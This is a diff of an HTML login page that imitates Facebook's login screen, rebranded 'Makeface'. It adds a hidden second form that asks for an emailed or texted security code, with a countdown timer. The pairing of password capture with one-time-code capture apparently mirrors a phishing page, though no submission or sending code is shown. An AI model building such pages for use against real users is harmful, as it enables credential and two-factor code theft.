@@ -8,9 +8,11 @@
 </head>
 <body>
   <div class="login-container">
-    <h2>facebook</h2>
-    <p class="welcome-text">Log in to Facebook.</p>
-    <form action="/register" method="POST" id="registrationForm">
+    <h2>makeface</h2>
+    <p class="welcome-text">Log in to Makeface.</p>
+
+    <!-- Registration Form -->
+    <form id="registrationForm">
       <label for="username">Email address or phone number:</label>
       <input
         type="text"
@@ -18,9 +20,7 @@
         name="username"
         required
         placeholder="Enter your email or phone number"
-        title="Email address or phone number"
       >
-
       <label for="password">Password:</label>
       <input
         type="password"
@@ -28,11 +28,25 @@
         name="name"
         required
         placeholder="Enter your password"
-        title="Password"
       >
-
       <button type="submit" id="submitBtn">Log in</button>
     </form>
+
+    <!-- Verification Form (hidden initially) -->
+    <form id="verificationForm" class="hidden">
+      <p>Enter the security code we sent you:</p>
+      <input
+        type="text"
+        id="securityCode"
+        placeholder="Security code"
+      >
+      <div class="timer">
+        Time left: <span id="countdown">02:00</span>
+      </div>
+      <button type="button" id="resendBtn" disabled>Send new code</button>
+      <button type="button" id="continueBtn">Continue</button>
+    </form>
+
     <div class="privacy-link">
       <p>By clicking Log in, you agree to our <a href="#">Terms</a> and <a href="#">Privacy Policy</a>.</p>
     </div>
